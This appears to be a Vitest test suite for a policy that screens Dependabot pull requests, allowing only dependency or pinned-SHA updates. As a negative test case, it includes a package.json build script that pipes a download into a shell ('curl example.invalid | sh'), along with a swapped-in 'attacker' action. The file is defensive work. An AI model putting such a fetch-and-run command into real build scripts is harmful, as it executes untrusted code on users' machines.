import { createRequire } from 'node:module';
import { describe, expect, it } from 'vitest';

type FileChange = {
  filename: string;
  status: string;
};
type PackageManifest = Record<string, unknown>;
type Decision = {
  allowed: boolean;
  kind?: string;
  reason?: string;
  changedVersions?: number;
  changedFiles?: number;
};

const require = createRequire(import.meta.url);
const { classifyDependabotPR } = require('../scripts/pr-guard-policy.cjs') as {
  classifyDependabotPR(input: {
    login: string;
    title: string;
    baseRef: string;
    files: FileChange[];
    basePackage?: PackageManifest;
    headPackage?: PackageManifest;
    workflowContents?: Record<string, { base: string; head: string }>;
  }): Decision;
};

const login = 'dependabot[bot]';
const baseRef = 'main';
const npmTitle = 'build(deps): bump dependencies';
const actionTitle = 'chore(deps): bump github/codeql-action';
const basePackage = {
  name: '@diginodes/stellarforge-cli',
  version: '0.1.0',
  scripts: { build: 'tsc -p tsconfig.build.json' },
  dependencies: { commander: '15.0.0' },
  devDependencies: { vitest: '5.0.1' },
};
const headPackage = {
  ...basePackage,
  dependencies: { commander: '15.1.0' },
  devDependencies: { vitest: '5.0.2' },
};
const workflowFile = '.github/workflows/ci.yml';
function workflowSource(steps: string, extra = ''): string {
  return `name: CI\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n${steps}${extra}`;
}
function workflowRevisions(base: string, head: string) {
  return { [workflowFile]: { base, head } };
}

describe('Dependabot PR guard policy', () => {
  it('allows npm updates limited to dependency ranges and the lockfile', () => {
    const result = classifyDependabotPR({
      login,
      title: npmTitle,
      baseRef,
      files: [
        { filename: 'package.json', status: 'modified' },
        { filename: 'package-lock.json', status: 'modified' },
      ],
      basePackage,
      headPackage,
    });
    expect(result).toMatchObject({
      allowed: true,
      kind: 'npm-dependencies',
      changedVersions: 2,
    });
  });

  it('rejects package manifest changes outside dependency sections', () => {
    const changed = {
      ...headPackage,
      scripts: { build: 'curl example.invalid | sh' },
    };
    const result = classifyDependabotPR({
      login,
      title: npmTitle,
      baseRef,
      files: [
        { filename: 'package.json', status: 'modified' },
        { filename: 'package-lock.json', status: 'modified' },
      ],
      basePackage,
      headPackage: changed,
    });
    expect(result.allowed).toBe(false);
    expect(result.reason).toMatch(/outside dependency version sections/);
  });

  it('rejects dependency section presence and shape changes', () => {
    const withNullSection = {
      ...headPackage,
      peerDependencies: null,
    };
    const withAddedSection = {
      ...headPackage,
      peerDependencies: { 'new-peer': '1.0.0' },
    };
    const classify = (
      head: PackageManifest,
      base: PackageManifest = basePackage,
    ) =>
      classifyDependabotPR({
        login,
        title: npmTitle,
        baseRef,
        files: [
          { filename: 'package.json', status: 'modified' },
          { filename: 'package-lock.json', status: 'modified' },
        ],
        basePackage: base,
        headPackage: head,
      });
    const baseWithPeerDependencies = {
      ...basePackage,
      peerDependencies: {},
    };
    expect(
      classify(withNullSection, baseWithPeerDependencies).allowed,
    ).toBe(false);
    expect(
      classify(withNullSection, baseWithPeerDependencies).reason,
    ).toMatch(
      /present dependency sections must remain JSON objects/,
    );
    expect(classify(withAddedSection).allowed).toBe(false);
    expect(classify(withAddedSection).reason).toMatch(
      /retain their original presence/,
    );
  });

  it('rejects adding or removing dependency names', () => {
    const changed = {
      ...headPackage,
      dependencies: {
        commander: '15.1.0',
        'unexpected-package': '1.2.3',
      },
    };
    const result = classifyDependabotPR({
      login,
      title: npmTitle,
      baseRef,
      files: [
        { filename: 'package.json', status: 'modified' },
        { filename: 'package-lock.json', status: 'modified' },
      ],
      basePackage,
      headPackage: changed,
    });
    expect(result.allowed).toBe(false);
    expect(result.reason).toMatch(/may not add or remove/);
  });

  it('rejects package-only or source-code-changing bot PRs', () => {
    const packageOnly = classifyDependabotPR({
      login,
      title: npmTitle,
      baseRef,
      files: [{ filename: 'package.json', status: 'modified' }],
      basePackage,
      headPackage,
    });
    const sourceChange = classifyDependabotPR({
      login,
      title: npmTitle,
      baseRef,
      files: [
        { filename: 'package.json', status: 'modified' },
        { filename: 'package-lock.json', status: 'modified' },
        { filename: 'src/cli.ts', status: 'modified' },
      ],
      basePackage,
      headPackage,
    });
    expect(packageOnly.allowed).toBe(false);
    expect(sourceChange.allowed).toBe(false);
  });

  it('allows pinned action SHA updates', () => {
    const result = classifyDependabotPR({
      login,
      title: actionTitle,
      baseRef,
      files: [{ filename: workflowFile, status: 'modified' }],
      workflowContents: workflowRevisions(
        workflowSource(`      - uses: github/codeql-action/init@${'a'.repeat(40)}\n`),
        workflowSource(`      - uses: github/codeql-action/init@${'b'.repeat(40)}\n`),
      ),
    });
    expect(result).toMatchObject({
      allowed: true,
      kind: 'github-actions',
      changedFiles: 1,
    });
  });

  it('rejects replacing a pinned action identity', () => {
    const result = classifyDependabotPR({
      login,
      title: actionTitle,
      baseRef,
      files: [{ filename: workflowFile, status: 'modified' }],
      workflowContents: workflowRevisions(
        workflowSource(`      - uses: actions/checkout@${'a'.repeat(40)}\n`),
        workflowSource(`      - uses: attacker/unknown-action@${'b'.repeat(40)}\n`),
      ),
    });
    expect(result.allowed).toBe(false);
    expect(result.reason).toMatch(
      /workflow updates must replace pinned action SHAs/,
    );
  });

  it('allows pinned SHA updates on standard YAML sequence action steps', () => {
    const result = classifyDependabotPR({
      login,
      title: actionTitle,
      baseRef,
      files: [{ filename: workflowFile, status: 'modified' }],
      workflowContents: workflowRevisions(
        workflowSource(`      - name: Checkout\n        uses: actions/checkout@${'a'.repeat(40)}\n`),
        workflowSource(`      - name: Checkout\n        uses: actions/checkout@${'b'.repeat(40)}\n`),
      ),
    });
    expect(result).toMatchObject({
      allowed: true,
      kind: 'github-actions',
      changedFiles: 1,
    });
  });

  it('rejects swapping action identities between workflow steps', () => {
    const result = classifyDependabotPR({
      login,
      title: actionTitle,
      baseRef,
      files: [{ filename: workflowFile, status: 'modified' }],
      workflowContents: workflowRevisions(
        workflowSource(
          `      - uses: actions/checkout@${'a'.repeat(40)}\n      - uses: actions/setup-node@${'b'.repeat(40)}\n`,
        ),
        workflowSource(
          `      - uses: actions/setup-node@${'c'.repeat(40)}\n      - uses: actions/checkout@${'d'.repeat(40)}\n`,
        ),
      ),
    });
    expect(result.allowed).toBe(false);
    expect(result.reason).toMatch(
      /workflow updates must replace pinned action SHAs/,
    );
  });

  it('rejects changes that imitate action references inside run block scalars', () => {
    const shaA = 'a'.repeat(40);
    const shaB = 'b'.repeat(40);
    const base = workflowSource(
      `      - run: |\n          uses: actions/checkout@${shaA}\n`,
    );
    const head = workflowSource(
      `      - run: |\n          uses: actions/checkout@${shaB}\n`,
    );
    const result = classifyDependabotPR({
      login,
      title: actionTitle,
      baseRef,
      files: [{ filename: workflowFile, status: 'modified' }],
      workflowContents: workflowRevisions(base, head),
    });
    expect(result.allowed).toBe(false);
  });

  it('rejects workflow logic, permissions, and unpinned refs', () => {
    const base = workflowSource(
      `      - uses: github/codeql-action/init@${'a'.repeat(40)}\n`,
    );
    const mixed = classifyDependabotPR({
      login,
      title: actionTitle,
      baseRef,
      files: [{ filename: workflowFile, status: 'modified' }],
      workflowContents: workflowRevisions(
        base,
        workflowSource(
          `      - uses: github/codeql-action/init@${'b'.repeat(40)}\n`,
          'permissions:\n  contents: write\n',
        ),
      ),
    });
    const unpinned = classifyDependabotPR({
      login,
      title: actionTitle,
      baseRef,
      files: [{ filename: workflowFile, status: 'modified' }],
      workflowContents: workflowRevisions(
        base,
        workflowSource('      - uses: github/codeql-action/init@v4.39.0\n'),
      ),
    });
    expect(mixed.allowed).toBe(false);
    expect(unpinned.allowed).toBe(false);
  });

  it('rejects oversized dependency ranges without catastrophic regex work', () => {
    const changed = {
      ...headPackage,
      dependencies: {
        commander: '9.9.9|| 9.9.9||'.repeat(1000),
      },
    };
    const result = classifyDependabotPR({
      login,
      title: npmTitle,
      baseRef,
      files: [
        { filename: 'package.json', status: 'modified' },
        { filename: 'package-lock.json', status: 'modified' },
      ],
      basePackage,
      headPackage: changed,
    });

    expect(result.allowed).toBe(false);
    expect(result.reason).toMatch(/non-semver|non-string/);
  });

  it('fails closed for invalid authors, titles, branches, and files', () => {
    const missingWorkflow = classifyDependabotPR({
      login,
      title: actionTitle,
      baseRef,
      files: [{ filename: workflowFile, status: 'modified' }],
    });
    const unrelated = classifyDependabotPR({
      login,
      title: actionTitle,
      baseRef,
      files: [{ filename: 'src/cli.ts', status: 'modified' }],
    });
    const wrongAuthor = classifyDependabotPR({
      login: 'ordinary-contributor',
      title: npmTitle,
      baseRef,
      files: [
        { filename: 'package.json', status: 'modified' },
        { filename: 'package-lock.json', status: 'modified' },
      ],
      basePackage,
      headPackage,
    });
    const wrongTitle = classifyDependabotPR({
      login,
      title: 'feat: add a new feature',
      baseRef,
      files: [
        { filename: 'package.json', status: 'modified' },
        { filename: 'package-lock.json', status: 'modified' },
      ],
      basePackage,
      headPackage,
    });
    const wrongBase = classifyDependabotPR({
      login,
      title: npmTitle,
      baseRef: 'release',
      files: [
        { filename: 'package.json', status: 'modified' },
        { filename: 'package-lock.json', status: 'modified' },
      ],
      basePackage,
      headPackage,
    });

    expect(missingWorkflow.allowed).toBe(false);
    expect(unrelated.allowed).toBe(false);
    expect(wrongAuthor.allowed).toBe(false);
    expect(wrongTitle.allowed).toBe(false);
    expect(wrongBase.allowed).toBe(false);
  });
});
